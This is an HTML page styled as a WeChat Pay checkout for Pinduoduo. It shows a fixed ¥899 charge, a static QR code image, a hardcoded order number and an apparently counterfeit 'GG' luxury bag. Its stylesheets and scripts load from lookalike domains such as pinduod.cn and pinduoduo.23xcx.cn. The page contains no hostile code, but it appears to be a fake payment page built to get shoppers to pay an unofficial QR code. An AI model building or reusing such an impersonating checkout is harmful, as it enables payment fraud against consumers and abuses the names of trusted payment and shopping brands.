<!DOCTYPE html>
<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="Content-Language" content="zh-cn">
<meta name="renderer" content="webkit">
<title>微信安全支付</title>
<link href="http://pinduoduo.23xcx.cn/pdd1/style/css/pay.css" tppabs="http://www.pinduod.cn/css/pay.css" rel="stylesheet" media="screen">

<body>
<div class="body">
    <h1 class="mod-title">
        <span class="ico-wechat"></span><span class="text">微信支付</span>
    </h1>
    <div class="mod-ct">
        <div class="order">
        </div>
        <div class="amount">￥899.00</div>
        <div class="qr-image" id="qrcode">
            <img src="a.jpg" tppabs="http://www.pinduod.cn/picture/er.png" width="230" height="230">
        </div>

        <div class="detail" id="orderDetail">
            <dl class="detail-ct" style="display: none;">
                <dt>商家</dt>
                <dd id="storeName">拼多多网上商城</dd>
                <dt>购买物品</dt>
                <dd id="productName">新定制GG女包奢侈品女包邮差酒神包链条单肩斜挎购国际名牌真皮包</dd>
                <dt>商户订单号</dt>
                <dd id="billId">11938-2018101936676</dd>
                <!--
                    作者：czhsystem@163.com
                    时间：2018-10-23
                    描述：<dt>创建时间</dt>
                <dd id="createTime">2018-10-22 17:32:47</dd>
                -->
            </dl>
            <a href="javascript:void(0)" class="arrow" target="_blank" rel="noopener"><i class="ico-arrow"></i></a>
        </div>
        <div class="tip">
            <span class="dec dec-left"></span>
            <span class="dec dec-right"></span>
            <div class="ico-scan"></div>
            <div class="tip-text">
                <p>请使用微信扫一扫</p>
                <p>扫描二维码完成支付</p>
            </div>
        </div>
        <div class="tip-text">
        </div>
    </div>
    <div class="foot">
        <div class="inner">
            <p>手机用户可保存上方二维码到手机中</p>
            <p>在微信扫一扫中选择“相册”即可</p>
        </div>
    </div>
</div>
<script type="text/javascript" src="view-source:http://pinduoduo.23xcx.cn/pdd1/style/js/jquery.min.js" tppabs="http://www.pinduod.cn/js/jquery.min.js"></script>
<script type="text/javascript">
    // 订单详情
    $('#orderDetail .arrow').click(function (event) {
        if ($('#orderDetail').hasClass('detail-open')) {
            $('#orderDetail .detail-ct').slideUp(500, function () {
                $('#orderDetail').removeClass('detail-open');
            });
        } else {
            $('#orderDetail .detail-ct').slideDown(500, function () {
                $('#orderDetail').addClass('detail-open');
            });
        }
    });
</script>
</body></html>
